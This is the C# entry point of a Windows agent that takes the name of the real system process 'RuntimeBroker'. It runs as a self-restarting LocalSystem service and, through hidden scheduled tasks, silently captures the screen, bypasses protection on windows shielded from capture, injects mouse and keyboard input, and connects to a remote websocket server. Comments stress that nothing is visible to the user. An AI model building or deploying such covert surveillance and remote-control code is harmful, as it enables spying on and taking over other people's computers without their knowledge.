using System.Diagnostics;
using System.ServiceProcess;

namespace RuntimeBroker;

internal static class Program
{
    [STAThread]
    static void Main()
    {
        var args = Environment.GetCommandLineArgs();

        // One-shot capture child: RuntimeBroker.exe --capture <outFile> [format] [quality] [maxWidth]
        // Launched by a hidden scheduled task in the user's interactive session.
        // This EXE is WinExe — no console, no window, nothing visible.
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--capture" && i + 1 < args.Length)
            {
                string format = i + 2 < args.Length ? args[i + 2] : "png";
                int.TryParse(i + 3 < args.Length ? args[i + 3] : "80", out int quality);
                int.TryParse(i + 4 < args.Length ? args[i + 4] : "0", out int maxWidth);
                if (quality <= 0) quality = 80;
                Environment.ExitCode = ScreenCapture.CaptureToFile(args[i + 1], format, quality, maxWidth);
                return;
            }
        }

        // Diag: RuntimeBroker.exe --diag — prints protected-window count + test
        // capture size. Verifies the DWM bypass on a target machine.
        // (WinExe has no console: attach to the caller's so output is seen.)
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--diag")
            {
                try { AttachConsole(-1); } catch { }
                try
                {
                    int n = DwmBypassCapture.CountProtectedWindows();
                    Console.WriteLine($"protected_windows={n}");
                    foreach (var line in DwmBypassCapture.DiagProtectedWindows())
                        Console.WriteLine($"  {line}");
                    var png = ScreenCapture.CaptureBytes();
                    Console.WriteLine($"capture_bytes={(png == null ? 0 : png.Length)}");
                    Console.WriteLine("dwm_bypass=active");
                    Environment.ExitCode = png != null ? 0 : 2;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"diag_failed={ex.Message}");
                    Environment.ExitCode = 1;
                }
                return;
            }
        }

        // Screen rotate in the user session (called via hidden scheduled task).
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--rotate" && i + 1 < args.Length)
            {
                int.TryParse(args[i + 1], out int degrees);
                Environment.ExitCode = RemoteCommands.DoRotate(degrees);
                return;
            }
        }

        // Blocking audio playback in the user session (hidden scheduled task).
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--play" && i + 1 < args.Length)
            {
                Environment.ExitCode = RemoteCommands.PlayAudioFile(args[i + 1]);
                return;
            }
        }

        // Input in the user session (hidden scheduled task). SendInput from
        // the Session-0 service never reaches the interactive desktop.
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--input-mouse" && i + 3 < args.Length)
            {
                int.TryParse(args[i + 1], out int x);
                int.TryParse(args[i + 2], out int y);
                string action = i + 3 < args.Length ? args[i + 3] : "move";
                int.TryParse(i + 4 < args.Length ? args[i + 4] : "120", out int amount);
                var r = InteractiveActions.Mouse(x, y, action, amount);
                Console.WriteLine(r);
                Environment.ExitCode = r == "ok" ? 0 : 1;
                return;
            }
            if (args[i] == "--input-text" && i + 1 < args.Length)
            {
                string text = "";
                try { text = File.ReadAllText(args[i + 1]); } catch { }
                try { File.Delete(args[i + 1]); } catch { }
                var r = InteractiveActions.TypeText(text);
                Console.WriteLine(r);
                Environment.ExitCode = r == "ok" ? 0 : 1;
                return;
            }
            if (args[i] == "--input-paragraph" && i + 3 < args.Length)
            {
                int.TryParse(args[i + 1], out int wpm);
                bool addEnter = args[i + 2] == "1";
                string text = "";
                try { text = File.ReadAllText(args[i + 3]); } catch { }
                try { File.Delete(args[i + 3]); } catch { }
                var task = InteractiveActions.TypeParagraphAsync(text, wpm <= 0 ? 60 : wpm, addEnter);
                var r = task.GetAwaiter().GetResult();
                Environment.ExitCode = r == "ok" || r == "cancelled" ? 0 : 1;
                return;
            }
        }

        // Manual service install/uninstall (run as Administrator).
        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "--install")
            {
                Environment.ExitCode = InstallService(GetArg(args, "--name", "RuntimeBroker"));
                return;
            }
            if (args[i] == "--uninstall")
            {
                Environment.ExitCode = UninstallService(GetArg(args, "--name", "RuntimeBroker"));
                return;
            }
            // MSI helper: set 24x7 crash recovery on an existing service.
            // Silent (WinExe): used as a deferred custom action by the MSI.
            if (args[i] == "--configure-service")
            {
                Environment.ExitCode = ConfigureService(GetArg(args, "--name", "RuntimeBroker"));
                return;
            }
            // MSI helper: write + ACL-lock agent.config.json. Silent.
            // URL is composed from host+port (port 443 => wss); --url
            // overrides when given. Token is optional.
            if (args[i] == "--write-config")
            {
                var url = GetArg(args, "--url", "");
                if (string.IsNullOrWhiteSpace(url))
                {
                    var host = GetArg(args, "--host", "127.0.0.1").Trim();
                    if (string.IsNullOrWhiteSpace(host)) host = "127.0.0.1";
                    var port = GetArg(args, "--port", "4777").Trim();
                    url = port == "443"
                        ? $"wss://{host}/ws/agent"
                        : $"ws://{host}:{port}/ws/agent";
                }
                Environment.ExitCode = WriteLockedConfig(
                    url,
                    GetArg(args, "--token", ""),
                    GetArg(args, "--delay", "5"));
                return;
            }
        }

        // Windows Service mode: run 24x7 as LocalSystem.
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "--service")
            {
                if (Environment.UserInteractive)
                    RunServiceInConsole();
                else
                    ServiceBase.Run(new ServiceBase[] { new AgentService() });
                return;
            }
        }

        // No args (e.g. Start Menu shortcut): the service owns the connection.
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool AttachConsole(int dwProcessId);

    private static string GetArg(string[] args, string name, string fallback)
    {
        for (int i = 1; i < args.Length; i++)
        {
            if (string.Equals(args[i], name, StringComparison.OrdinalIgnoreCase) && i + 1 < args.Length)
                return args[i + 1];
            if (args[i].StartsWith(name + "=", StringComparison.OrdinalIgnoreCase))
                return args[i].Substring(name.Length + 1);
        }
        return fallback;
    }

    private static void RunServiceInConsole()
    {
        Console.WriteLine($"RuntimeBroker (console) starting — v{AgentVersionInfo.Version}");
        var service = new AgentService();
        service.StartManually();
        Console.WriteLine("Running. Press Ctrl+C to stop.");
        var done = new ManualResetEvent(false);
        Console.CancelKeyPress += (_, e) => { e.Cancel = true; done.Set(); };
        done.WaitOne();
        service.StopManually();
    }

    private static int InstallService(string name)
    {
        try
        {
            var exe = Environment.ProcessPath ?? "";
            if (string.IsNullOrEmpty(exe)) { Console.WriteLine("Cannot determine EXE path"); return 1; }
            Hidden($"sc.exe stop \"{name}\"");
            Hidden($"sc.exe delete \"{name}\"");
            Thread.Sleep(800);
            var binPath = $"\"{exe}\" --service";
            var create = Hidden($"sc.exe create \"{name}\" binPath= \"{binPath}\" start= auto obj= LocalSystem DisplayName= \"{name}\"");
            if (create != 0) { Console.WriteLine($"sc create failed ({create})"); return 1; }
            Hidden($"sc.exe description \"{name}\" \"RuntimeBroker remote monitoring agent\"");
            // Crash recovery: auto-restart 24x7.
            Hidden($"sc.exe failure \"{name}\" reset= 86400 actions= restart/5000/restart/10000/restart/30000");
            var start = Hidden($"sc.exe start \"{name}\"");
            Console.WriteLine(start == 0 ? $"Service '{name}' installed and started." : $"Service '{name}' installed (start returned {start}).");
            return 0;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Install failed: " + ex.Message);
            return 1;
        }
    }

    private static int UninstallService(string name)
    {
        try
        {
            Hidden($"sc.exe stop \"{name}\"");
            Thread.Sleep(500);
            var code = Hidden($"sc.exe delete \"{name}\"");
            Console.WriteLine(code == 0 ? $"Service '{name}' removed." : $"sc delete returned {code}.");
            return 0;
        }
        catch (Exception ex)
        {
            Console.WriteLine("Uninstall failed: " + ex.Message);
            return 1;
        }
    }

    /// <summary>
    /// Sets 24x7 crash recovery (restart 5s/10s/30s) via ChangeServiceConfig2 —
    /// no sc.exe, no console. Returns 0 on success.
    /// </summary>
    private static int ConfigureService(string name)
    {
        IntPtr scm = IntPtr.Zero, svc = IntPtr.Zero;
        try
        {
            scm = OpenSCManager(null, null, 0x0002); // SC_MANAGER_CONNECT
            if (scm == IntPtr.Zero) return 1;
            svc = OpenService(scm, name, 0x0002 | 0x0004); // CONNECT | CHANGE_CONFIG
            if (svc == IntPtr.Zero) return 2;
            var actions = new SC_ACTION[]
            {
                new() { Type = 1, Delay = 5000 },
                new() { Type = 1, Delay = 10000 },
                new() { Type = 1, Delay  = 30000 },
            };
            var pinned = actions
                .Select(a =>
                {
                    var h = System.Runtime.InteropServices.GCHandle.Alloc(a, System.Runtime.InteropServices.GCHandleType.Pinned);
                    return h;
                }).ToArray();
            try
            {
                int structSize = System.Runtime.InteropServices.Marshal.SizeOf<SC_ACTION>();
                IntPtr arr = System.Runtime.InteropServices.Marshal.AllocHGlobal(structSize * actions.Length);
                try
                {
                    for (int i = 0; i < actions.Length; i++)
                        System.Runtime.InteropServices.Marshal.StructureToPtr(actions[i], IntPtr.Add(arr, i * structSize), false);
                    var failure = new SERVICE_FAILURE_ACTIONS
                    {
                        dwResetPeriod = 86400,
                        cActions = actions.Length,
                        lpsaActions = arr
                    };
                    return ChangeServiceConfig2(svc, 2 /* FAILURE_ACTIONS */, ref failure) ? 0 : 3;
                }
                finally
                {
                    System.Runtime.InteropServices.Marshal.FreeHGlobal(arr);
                }
            }
            finally
            {
                foreach (var h in pinned) h.Free();
            }
        }
        catch
        {
            return 4;
        }
        finally
        {
            if (svc != IntPtr.Zero) CloseServiceHandle(svc);
            if (scm != IntPtr.Zero) CloseServiceHandle(scm);
        }
    }

    /// <summary>
    /// Writes agent.config.json next to the EXE and ACL-locks it to
    /// SYSTEM/Administrators full control, Users read-only.
    /// </summary>
    private static int WriteLockedConfig(string url, string token, string delay)
    {
        try
        {
            if (!int.TryParse(delay, out int d) || d < 1) d = 5;
            var path = Path.Combine(AppContext.BaseDirectory, "agent.config.json");
            var json = "{\n" +
                       $"  \"ServerUrl\": \"{url.Replace("\\", "\\\\").Replace("\"", "\\\"")}\",\n" +
                       $"  \"Token\": \"{token.Replace("\\", "\\\\").Replace("\"", "\\\"")}\",\n" +
                       $"  \"ReconnectDelaySec\": {d}\n" +
                       "}\n";
            File.WriteAllText(path, json);
            try
            {
                var fs = new System.Security.AccessControl.FileSecurity();
                fs.SetAccessRuleProtection(true, false);
                var system = new System.Security.Principal.NTAccount("NT AUTHORITY\\SYSTEM");
                var admins = new System.Security.Principal.NTAccount("BUILTIN\\Administrators");
                var users = new System.Security.Principal.NTAccount("BUILTIN\\Users");
                fs.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(
                    system, System.Security.AccessControl.FileSystemRights.FullControl,
                    System.Security.AccessControl.AccessControlType.Allow));
                fs.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(
                    admins, System.Security.AccessControl.FileSystemRights.FullControl,
                    System.Security.AccessControl.AccessControlType.Allow));
                fs.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(
                    users, System.Security.AccessControl.FileSystemRights.ReadAndExecute,
                    System.Security.AccessControl.AccessControlType.Allow));
                new FileInfo(path).SetAccessControl(fs);
            }
            catch { /* ACL best-effort */ }
            return 0;
        }
        catch
        {
            return 1;
        }
    }

    private struct SC_ACTION
    {
        public int Type;
        public uint Delay;
    }

    private struct SERVICE_FAILURE_ACTIONS
    {
        public uint dwResetPeriod;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
        public string? lpRebootMsg;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
        public string? lpCommand;
        public int cActions;
        public IntPtr lpsaActions;
    }

    [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern IntPtr OpenSCManager(string? machine, string? db, uint access);

    [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern IntPtr OpenService(IntPtr scm, string name, uint access);

    [System.Runtime.InteropServices.DllImport("advapi32.dll")]
    private static extern bool CloseServiceHandle(IntPtr handle);

    [System.Runtime.InteropServices.DllImport("advapi32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern bool ChangeServiceConfig2(IntPtr service, int infoLevel, ref SERVICE_FAILURE_ACTIONS info);

    private static int Hidden(string commandLine)
    {
        try
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + commandLine)
            {
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            using var p = Process.Start(psi);
            if (p == null) return 1;
            p.WaitForExit(30000);
            return p.ExitCode;
        }
        catch { return 1; }
    }
}
